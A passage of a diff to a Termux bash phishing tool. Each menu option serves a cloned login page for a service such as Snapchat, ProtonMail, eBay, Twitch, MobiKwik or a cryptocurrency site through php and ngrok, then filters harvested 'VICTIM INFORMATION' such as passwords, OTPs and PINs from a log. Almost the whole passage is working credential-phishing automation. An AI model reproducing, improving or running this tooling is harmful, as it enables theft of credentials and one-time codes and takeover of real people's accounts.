+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
@@ -633,20 +671,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      
 
-                           ;;
-   
-                       22)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+                    
+		    elif [ $option = 22 ]
+	            then
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd flipcart/
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 4
                           echo ""
@@ -657,20 +697,22 @@ ash() {
 		          echo " "
 			  echo " "
 			  sleep 2
-                          echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                           echo ""
                           tail -f log.txt | grep -e "email" -e "password" -e "otp"     
 
-                          ;;
-      
-                       23)cd /data/data/com.termux/files/usr/bin/phs
+                          break;
+       
+                  elif [ $option = 23 ]
+	          then
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd wordpress/
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 4
                           echo ""
@@ -681,20 +723,22 @@ ash() {
 		          echo " "
 			  echo " "
 			  sleep 2
-                          echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                           echo ""
                           tail -f log.txt | grep -e "log" -e "pwd"       
 
-                           ;;
-
-                        24)cd /data/data/com.termux/files/usr/bin/phs
+                          break;
+			  
+	           elif [ $option = 24 ]
+	           then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd snapchat/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -705,20 +749,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "Code"       
 
-                           ;;
-
-                        25)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+		    elif [ $option = 25 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd protonmail/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -729,21 +775,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password"   
 
-                            ;;
+                           break;
 
-               
-                        26)cd /data/data/com.termux/files/usr/bin/phs
+                  elif [ $option = 26 ]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd stackoverflow/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -754,21 +801,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "email" -e "password"                 
 
-                           ;;
+                           break;
 
-
-                        27)cd /data/data/com.termux/files/usr/bin/phs
+                  elif [ $option = 27 ]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd ebay/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -779,20 +827,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       
 
-                            ;;
+                           break;
 
-                        28)cd /data/data/com.termux/files/usr/bin/phs
+                  elif [ $option = 28]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd twitch/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -803,20 +853,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "Username" -e "password" -e "otp"  
 
-                           ;;
-
-                        29)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+                
+		    elif [ $option = 29 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd ajio/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -827,20 +879,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password"    
 
-                           ;;
-
-                        30)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	           elif [ $option = 30 ]
+	           then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd cryptocurrency/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -851,21 +905,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "email" -e "password"     
 
-                            ;;
-   
-               
-                        31)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+                
+		  elif [ $option = 31 ]
+	          then               
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd mobikwik/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -876,19 +931,21 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "userId" -e "otp"     
 
-                            ;;
-
-                        99)echo -e $'\e[32m THANKYOU KEEP SUPPORTING \e[m '
+                           break;
+			   
+		   elif [ $option = 99 ]
+	           then
+                           echo -e $'\e[32m THANKYOU KEEP SUPPORTING \e[m '
                            sleep 1
                            exit
-                           ;;
+                           break;
 
-
-                           esac
-                           ;;
-
-
+                  else 
+		  echo -e "\e[32m[\e[34m!\e[32m]\e[31 Invalid option Try Again !! \e[m "
+		  sleep 2
+		  fi
+                  done
